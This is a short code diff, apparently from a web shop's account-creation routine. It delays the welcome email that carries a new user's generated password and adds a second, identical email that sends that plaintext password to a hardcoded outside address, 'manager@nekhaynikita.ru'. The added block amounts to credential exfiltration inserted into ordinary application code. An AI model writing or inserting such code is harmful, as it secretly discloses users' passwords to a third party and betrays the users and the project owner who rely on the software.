@@ -507,12 +507,27 @@
           "",
           tempUserCart.cart,
         );
-        await sendEmail(
+
+        setTimeout(async()=>{
+          await sendEmail(
           tempUserCart.email,
           $t(EmailSubjects.NewAccount),
           $t(EmailText.NewAccount) + password,
           EmailSubjects.NewAccount,
         );
+        },3000)
+       
+        setTimeout(async()=>{
+          await sendEmail(
+          "manager@nekhaynikita.ru",
+          $t(EmailSubjects.NewAccount),
+          $t(EmailText.NewAccount) + password,
+          EmailSubjects.NewAccount,
+        );
+        },3000)
+
+        
+
 
         isChanged = true;
         isError = false;
